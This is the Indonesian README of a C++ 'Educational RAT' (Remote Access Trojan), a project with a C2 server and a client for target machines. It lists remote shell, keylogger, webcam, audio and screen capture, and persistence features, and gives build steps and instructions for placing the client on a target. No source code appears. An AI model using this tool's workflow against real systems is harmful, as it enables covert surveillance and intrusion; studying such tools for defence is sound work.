# Educational RAT (Remote Access Trojan)

**PENTING:** Software ini dikembangkan **HANYA UNTUK TUJUAN PENDIDIKAN**.
Penggunaan tool ini untuk mengakses sistem tanpa izin eksplisit adalah ILEGAL.

## Deskripsi

Educational RAT adalah implementasi Remote Access Trojan untuk tujuan belajar konsep:

- Pemrograman jaringan client-server
- Komunikasi terenkripsi antar aplikasi
- Interaksi dengan sistem operasi
- Arsitektur software terdistribusi

Tool ini mendemonstrasikan bagaimana aplikasi remote access bekerja dengan fitur-fitur:

- Remote shell execution
- File manager (browse, upload, download)
- Screen capture
- Webcam capture
- Audio recording
- Process management
- Persistence (autorun)
- Keylogger

## Peringatan Hukum

Menggunakan software ini untuk mengakses sistem tanpa izin eksplisit adalah ILEGAL dan dapat berakibat:

- Tuntutan pidana
- Gugatan perdata
- Sanksi akademis

## Tech Stack & Library

### Bahasa Pemrograman

- C++11 (standar kompilasi)

### Library Utama

- **OpenSSL** - Untuk enkripsi komunikasi (AES-256-CBC)
- **POSIX Threads** - Untuk multithreading
- **Socket API** - Untuk komunikasi jaringan
- **Standard C++ Library** - STL containers, string manipulation, dll

### Library Sistem

- **dirent.h** - Untuk operasi direktori
- **sys/utsname.h** - Untuk informasi sistem
- **sys/stat.h** - Untuk status file
- **pwd.h** - Untuk informasi user

### Komponen Utama

- **Protocol** - Komunikasi custom binary dengan header dan payload
- **Crypto** - Enkripsi AES dengan IV dan checksums
- **Network** - Socket handling dengan TCP
- **Utils** - Helper functions (random string, checksum calculation, dll)

## Struktur Proyek

- `server/` - Command and control server
- `client/` - Komponen client yang berjalan di sistem target
- `common/` - Kode yang digunakan bersama antara server dan client
- `docs/` - Dokumentasi dan resources pembelajaran
- `bin/` - Direktori untuk executable hasil kompilasi

## Cara Membangun (Build)

### Prasyarat

- Sistem operasi Linux/Unix
- Compiler C++ (GCC/Clang)
- Library OpenSSL development
- Build tools (make)

### Instalasi Dependencies

Pada Debian/Ubuntu:

```bash
sudo apt update
sudo apt install build-essential libssl-dev
```

Pada Fedora/RHEL/CentOS:

```bash
sudo dnf install gcc-c++ openssl-devel make
# atau
sudo yum install gcc-c++ openssl-devel make
```

### Kompilasi

```bash
# Buat direktori bin
make setup

# Build server dan client
make

# Atau build komponen terpisah
make server
make client
```

## Cara Penggunaan

### Menjalankan Server

```bash
./bin/server [options]
```

Options:

- `-p, --port PORT` - Spesifikasi port (default: 8080)
- `-h, --help` - Menampilkan pesan bantuan

### Menjalankan Client

```bash
./bin/client [options]
```

Options:

- `-s, --server ADDR` - Alamat server (default: 127.0.0.1)
- `-p, --port PORT` - Port server (default: 8080)
- `-h, --help` - Menampilkan pesan bantuan

### Cara Menyambungkan

1. **Memulai Server**:

   - Jalankan server di komputer yang akan berfungsi sebagai pengendali:
     ```
     ./bin/server
     ```
   - Catat IP address server (dapat dilihat dengan `ifconfig` atau `ip addr`)
   - Pastikan port 8080 (atau port yang dikonfigurasi) terbuka di firewall

2. **Menjalankan Client**:

   - Salin executable client (`bin/client`) ke komputer target
   - Jalankan client dengan parameter alamat server:
     ```
     ./bin/client -s <SERVER_IP_ADDRESS>
     ```
   - Client akan otomatis terhubung ke server dan mengirimkan informasi sistem

3. **Operasi Server**:
   - Setelah client terhubung, server akan menampilkan daftar client yang terhubung
   - Pilih client dengan perintah `select <CLIENT_ID>`
   - Eksekusi perintah pada client yang dipilih

### Perintah Server

Setelah server berjalan, Anda dapat menggunakan perintah berikut:

- `help` - Menampilkan perintah yang tersedia
- `list` - Menampilkan daftar client yang terhubung
- `select <client_id>` - Memilih client untuk berinteraksi
- `ping <client_id>` - Mengirim ping ke client
- `shell <client_id> <command>` - Menjalankan perintah shell di client
- `screenshot <client_id>` - Mengambil screenshot dari client
- `webcam <client_id>` - Mengambil gambar dari webcam client
- `files <client_id> <path>` - Menampilkan daftar file di direktori pada client
- `download <client_id> <remote_path> <local_path>` - Mengunduh file dari client
- `upload <client_id> <local_path> <remote_path>` - Mengunggah file ke client
- `ps <client_id>` - Menampilkan daftar proses pada client
- `kill <client_id> <pid>` - Menghentikan proses pada client
- `keylogger <client_id> <start|stop|dump>` - Mengontrol keylogger
- `persist <client_id>` - Memasang persistence pada client
- `unpersist <client_id>` - Menghapus persistence dari client
- `broadcast <command>` - Menjalankan perintah pada semua client
- `exit` - Keluar dari program

## Troubleshooting

- **Koneksi Gagal**: Pastikan port terbuka di firewall dan server berjalan
- **Client Terputus**: Client akan otomatis mencoba terhubung kembali (30 detik interval default)
- **Permission Issues**: Pastikan executable memiliki izin eksekusi (`chmod +x bin/server bin/client`)

## Dokumentasi Lebih Lanjut

Lihat direktori `docs/` untuk dokumentasi teknis lebih detail:

- `SETUP.md` - Instruksi pengaturan dan build
- `TECHNICAL.md` - Dokumentasi teknis tentang arsitektur
- `SECURITY.md` - Pertimbangan keamanan

## Pembelajaran Lebih Lanjut

Untuk mempelajari lebih lanjut tentang cybersecurity, pertimbangkan sumber-sumber resmi ini:

- [TryHackMe](https://tryhackme.com/)
- [HackTheBox](https://www.hackthebox.eu/)
- [Cybrary](https://www.cybrary.it/)
- [OWASP](https://owasp.org/)

## Lisensi

Software ini dilisensikan di bawah MIT License, hanya untuk tujuan pendidikan.
